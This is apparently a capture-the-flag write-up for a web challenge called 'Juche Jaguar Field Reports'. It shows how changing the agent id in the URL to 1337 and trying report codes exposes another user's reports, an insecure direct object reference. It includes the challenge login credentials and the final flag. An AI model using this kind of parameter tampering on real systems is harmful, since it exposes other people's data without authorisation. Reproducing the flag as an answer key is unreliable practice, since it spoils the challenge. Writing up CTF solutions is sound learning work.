# 🕵️‍♀️ Juche Jaguar Field Reports – IDOR Exploit

**Category:** Web Security\
**Points:** Unknown\
**Type:** Insecure Direct Object Reference (IDOR)

---

### 🎯 Objective

Gain access to the Supreme Leader’s secret pizza discount code hidden within the Juche Jaguar Field Reports web app.

---

### 🛠️ Tools & Techniques Used

- Web Browser (manual testing)
- IDOR exploitation
- URL parameter tampering
- Leetspeak logic

---

### 🔍 Step-by-Step Exploit

#### Step 1: Initial Access

Logged in to the portal at:

```
http://35.245.106.190/login.html
```

with weak credentials:

```
Username: 1234
Password: spudpotato
```

#### Step 2: Observing Accessible Reports

The dashboard displays 5 reports for Agent 1234:

```
UV12WX, YZ34AB, CD56EF, GH78IJ, KL90MN
```

Each report is accessible via:

```
http://35.245.106.190/dashboard.php?id=1234&code=<ReportCode>
```

#### Step 3: Spotting the Vulnerability

The use of predictable parameters (`id` and `code`) indicated a likely IDOR vulnerability.

#### Step 4: Interpreting the Hint

Hint mentioned a “leet” agent. Applied leetspeak:

```
leet → 1337
```

#### Step 5: Exploring Agent 1337’s Reports

Tried:

```
http://35.245.106.190/dashboard.php?id=1337
```

Success! New reports for EliteSpud appeared:

```
YZ12AB, CD34EF, GH56IJ, KL78MN, OP90QR
```

#### Step 6: Brute-Forcing the Report Codes

Manually tried each:

```
http://35.245.106.190/dashboard.php?id=1337&code=YZ12AB
...
http://35.245.106.190/dashboard.php?id=1337&code=GH56IJ
```

#### 🧀 Step 7: Jackpot – The Pizza Flag

Accessing the GH56IJ report revealed:

```
"I extracted the Supreme Leader’s secret pizza-order discount code:
C1{ID0R_F13LD_R3P0RT}"
```

---

### 🏁 Flag

```
C1{ID0R_F13LD_R3P0RT}
```

---

### 📝 Takeaways

- IDOR vulnerabilities are often present in apps with parameterized access control.
- Manual testing can be very effective when parameters are predictable.
- Leetspeak hints are often literal in CTFs — always try numeric substitution!

---

